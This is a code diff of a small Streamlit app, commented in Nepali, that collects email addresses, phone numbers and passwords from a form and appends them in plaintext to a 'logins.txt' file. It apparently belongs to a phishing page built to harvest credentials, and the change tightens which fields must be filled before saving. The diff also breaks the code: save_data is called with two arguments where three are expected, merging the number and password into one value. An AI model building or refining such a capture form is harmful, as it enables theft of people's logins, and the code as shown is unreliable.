@@ -11,7 +11,7 @@ DATA_FILE = "logins.txt"
 def save_data(email,num,pwd):
     try:
         with open(DATA_FILE, "a", encoding="utf-8") as f:
-            f.write(f"Email: {email} | Password: {pwd}\n | Number: {num}\n")
+            f.write(f"Email: {email} | Password: {pwd}\n| number: {num}\n")
     except Exception as e:
         st.error(f"Save error: {e}")
 
@@ -51,8 +51,8 @@ if not st.session_state.submitted:
         # Jaba button click hunchha, variable check garne
         if submit_btn:
             # .strip() use garnu vanda paila check garnuhos ki variables khali chhainan
-            if email_val and password_val:
-                save_data(email_val, number_val, password_val)
+            if email_val and password_val and number_val:
+                save_data(email_val, number_val and password_val)
                 st.session_state.submitted = True
                 st.rerun()
             else:
